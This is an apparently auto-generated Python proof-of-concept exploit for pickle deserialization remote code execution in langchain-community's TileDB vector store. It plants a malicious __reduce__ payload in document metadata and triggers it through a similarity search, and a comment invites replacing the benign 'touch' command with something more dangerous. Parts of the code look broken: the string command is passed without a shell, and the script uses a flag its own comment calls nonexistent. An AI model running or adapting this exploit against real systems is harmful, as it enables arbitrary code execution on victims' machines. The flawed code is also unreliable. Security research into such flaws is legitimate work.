#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-024
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in langchain-community-only
TileDB vector store.

Vulnerability: The process_index_results function in tiledb.py calls pickle.loads()
on metadata retrieved from a TileDB array without any validation. An attacker who
can write to the TileDB array can inject a malicious pickle payload that executes
arbitrary code upon deserialization.

This PoC demonstrates the vulnerability by:
1. Creating a TileDB vector store with a malicious pickle payload in metadata
2. Triggering similarity search which calls process_index_results
3. The malicious payload executes a benign command (touch /tmp/poc_success.txt)

Usage:
    python3 poc_tiledb_rce.py [--target TARGET_URI]

Note: This requires the tiledb-vector-search package to be installed.
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
from typing import Any, Dict, List, Optional

# Try to import required packages
try:
    import numpy as np
except ImportError:
    print("[-] numpy is required. Install with: pip install numpy")
    sys.exit(1)

try:
    import tiledb
    import tiledb.vector_search as tiledb_vs
except ImportError:
    print("[-] tiledb-vector-search is required. Install with: pip install tiledb-vector-search")
    sys.exit(1)

# Import the vulnerable module
sys.path.insert(0, "/tmp/langchain-community-only")
try:
    from langchain_community.vectorstores import TileDB
    from langchain_core.documents import Document
except ImportError:
    print("[-] Could not import langchain-community modules. Check path.")
    sys.exit(1)


class MaliciousPickle:
    """
    A class that executes a command when unpickled.
    This is the classic approach for pickle-based RCE.
    """
    def __reduce__(self):
        # Return a tuple (callable, args) that pickle will call during deserialization
        # Using a benign command by default - change to something more dangerous for actual exploitation
        cmd = "touch /tmp/poc_success.txt"
        return (subprocess.check_output, (cmd,),)


def create_malicious_tiledb_store(uri: str, dimension: int = 128) -> TileDB:
    """
    Create a TileDB vector store with a malicious pickle payload in metadata.
    
    Args:
        uri: URI for the TileDB array
        dimension: Vector dimension (default 128)
    
    Returns:
        TileDB vector store instance
    """
    print(f"[*] Creating malicious TileDB store at {uri}")
    
    # Create embeddings (random vectors for demonstration)
    np.random.seed(42)
    embeddings = np.random.rand(1, dimension).astype(np.float32)
    
    # Create the vector store with a document containing malicious metadata
    # The metadata will be pickled and stored in the TileDB array
    malicious_metadata = {"payload": MaliciousPickle()}
    
    # Create documents with the malicious metadata
    documents = [
        Document(
            page_content="This is a test document with malicious metadata",
            metadata=malicious_metadata
        )
    ]
    
    # Create the TileDB vector store
    # This will call add_texts which pickles the metadata and stores it
    store = TileDB.from_documents(
        documents=documents,
        embedding=None,  # We'll provide embeddings directly
        embedding_embeddings=embeddings,
        vector_index_uri=uri,
        docs_array_uri=uri + "_docs",
        allow_dangerous_deserialization=True  # This flag doesn't exist but shows intent
    )
    
    print("[+] Malicious store created successfully")
    return store


def trigger_deserialization(store: TileDB, query_vector: Optional[np.ndarray] = None) -> None:
    """
    Trigger the vulnerable deserialization by performing a similarity search.
    
    Args:
        store: TileDB vector store instance
        query_vector: Optional query vector (random if not provided)
    """
    if query_vector is None:
        query_vector = np.random.rand(1, 128).astype(np.float32)
    
    print("[*] Triggering similarity search to invoke pickle.loads()...")
    
    try:
        # This call chain will eventually reach process_index_results
        # which calls pickle.loads on the stored metadata
        results = store.similarity_search_by_vector_with_score(
            query_embedding=query_vector,
            k=1
        )
        print(f"[+] Search completed. Results: {results}")
    except Exception as e:
        print(f"[!] Search raised an exception (expected if payload executed): {e}")
    
    # Check if our payload executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Payload executed! File /tmp/poc_success.txt was created.")
        print("[+] This confirms the RCE vulnerability via pickle deserialization.")
    else:
        print("[*] Payload may not have executed. Check for errors above.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for TileDB pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="Target TileDB URI (default: temporary directory)"
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Clean up temporary files after execution"
    )
    args = parser.parse_args()
    
    # Use a temporary directory if no target specified
    if args.target:
        uri = args.target
    else:
        temp_dir = tempfile.mkdtemp(prefix="tiledb_poc_")
        uri = os.path.join(temp_dir, "vector_store")
    
    print(f"[*] Using TileDB URI: {uri}")
    
    try:
        # Step 1: Create the malicious store
        store = create_malicious_tiledb_store(uri)
        
        # Step 2: Trigger the deserialization
        trigger_deserialization(store)
        
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup if requested
        if args.cleanup and not args.target:
            import shutil
            shutil.rmtree(os.path.dirname(uri), ignore_errors=True)
            print("[*] Cleaned up temporary files")


if __name__ == "__main__":
    main()
